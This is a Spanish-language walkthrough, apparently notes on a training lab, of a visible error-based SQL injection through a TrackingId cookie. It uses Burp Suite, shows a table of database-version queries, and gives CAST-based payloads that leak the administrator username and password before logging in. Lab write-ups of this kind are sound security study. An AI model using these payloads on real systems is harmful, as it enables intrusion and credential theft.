![[Pasted image 20250726161641.png]]

Vamos a analizar la consulta con BurpSuite, para poder modificar el campo inyectable:

![[Pasted image 20250726162006.png]]
![[Pasted image 20250726162035.png]]

Vamos a colocar una comilla en el campo `TrackingId`, para ver como reacciona la web.

![[Pasted image 20250726162151.png]]
![[Pasted image 20250726162241.png]]

Vemos que el error que la web nos muestra un error, el él podemos observar la consulta que realiza a la base de datos.

Consulta original `SQL SELECT * FROM tracking WHERE id = 'fH5hX0bJu9VeRovc'`

Por lo tanto, entendemos que cuando la consulta que hagamos no sea exitosa, la web mostrará el error de la BBDD. Vamos a probar concatenar una consulta tipo select `'||(SELECT '')-- -`

![[Pasted image 20250726163412.png]]
![[Pasted image 20250726163433.png]]

Vemos que le ha gustado la consulta que le hemos enviado.
### Conocer que base de datos corre por detrás
****
## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

|            |                                                                                                                            |
| ---------- | -------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT banner FROM v$version`                                                            `SELECT version FROM v$instance` |
| Microsoft  | `SELECT @@version`                                                                                                         |
| PostgreSQL | `SELECT version()`                                                                                                         |
| MySQL      | `SELECT @@version`                                                                                                         |
Teniendo en cuenta esta tabla, veremos que tipo de gestor de BBBDD se está utilizando por detrás, según si se muestra o no el error. Para ello, haremo uso de la siguiente consulta para averiguar la version `'||(SELECT version())`, en caso que devuelva un estado exitoso, el gestor será PostgreSQL.

![[Pasted image 20250726164536.png]]
![[Pasted image 20250726163433.png]]

Normalmente, las consultas suelen tener un límite de caracteres, por lo tanto vamos a borrar la cookie de `TrackingId` y vamos a colocar una comilla para cerrar esa consulta, se vería de esta forma `TrackingId='<SQLI>` para poder ganar más caracteres a la hora de escribir nuestra consulta.
### Conocer la existencia del usuario administrador
****
Una vez sabemos que la tabla `users` existe. Debemos saber si el usuario `administrator` es válido. Para ello, haremos uso de la siguiente consulta.

Consulta para verificar la exitencia de un usuario visible error-based PostgreSQL: `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)-- -`

![[Pasted image 20250726172334.png]]
![[Pasted image 20250726172356.png]]

Vemos que la base de datos nos ha devuelto el usuario `administrator` ,por lo tanto existe.

### Conocer la contraseña de administrator
****
Para ello haremos uso de la siguiente consulta.

Consulta para conocer la contraseña de un usuario visible error-based PostgreSQL: `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)-- -`

![[Pasted image 20250726173006.png]]
![[Pasted image 20250726173035.png]]

### Nos logueamos como el usuario administrator
****
![[Pasted image 20250726173241.png]]
![[Pasted image 20250726173336.png]]

